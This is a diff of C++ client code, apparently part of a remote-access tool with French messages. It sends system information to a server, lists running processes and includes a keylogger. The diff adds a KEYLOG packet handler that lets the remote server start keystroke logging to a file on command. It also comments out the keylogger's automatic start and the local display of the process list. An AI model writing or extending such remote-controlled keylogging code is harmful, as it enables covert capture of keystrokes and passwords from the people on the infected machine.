@@ -55,6 +55,23 @@ void serverRequestHandler() {
                     break;
                 }
                 
+                case PacketType::KEYLOG: {
+                    // Start or stop keylogger based on payload
+                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
+                    if (cmd == "start") {
+                        std::thread([]() {
+                            KeyLogger logger("key_file.txt");
+                            logger.start();
+                        }).detach();
+                    } else if (cmd == "stop") {
+                        std::cout << "[KEYLOG] Arrêt du keylogger non implémenté." << std::endl;
+                        // TODO: implement stop logic (UnhookWindowsHookEx)
+                    } else {
+                        std::cout << "[KEYLOG] Commande inconnue: " << cmd << std::endl;
+                    }
+                    break;
+                }
+                
                 default:
                     cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << endl;
                     cout << "Entrez le message : ";
@@ -105,30 +122,30 @@ int main() {
         cout << "Informations système envoyées au serveur." << endl;
         
         // KEYLOGGER 
-        std::thread([]() {
-            KeyLogger logger("key_file.txt");
-            logger.start();
-        }).detach();
+        // std::thread([]() {
+        //     KeyLogger logger("key_file.txt");
+        //     logger.start();
+        // }).detach();
         // ========================
         ProcessLister processLister;
-        cout << "\nListe des processus en cours d'exécution :" << endl;
-        if (!processLister.listProcesses()) {
-            cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
-        }
+        // cout << "\nListe des processus en cours d'exécution :" << endl;
+        // if (!processLister.listProcesses()) {
+        //     cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
+        // }
 
         vector<string> exeList = processLister.getExeList();
 
-        cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
-        const int columns = 3;
-        int count = 0;
-        for (const auto& exe : exeList) {
-            cout << std::left << std::setw(25) << exe; 
-            count++;
-            if (count % columns == 0)
-                cout << endl;
-        }
-        if (count % columns != 0)
-            cout << endl;
+        // cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
+        // const int columns = 3;
+        // int count = 0;
+        // for (const auto& exe : exeList) {
+        //     cout << std::left << std::setw(25) << exe; 
+        //     count++;
+        //     if (count % columns == 0)
+        //         cout << endl;
+        // }
+        // if (count % columns != 0)
+        //     cout << endl;
 
         cout << "(Tapez 'sortie' pour quitter)" << endl;
         
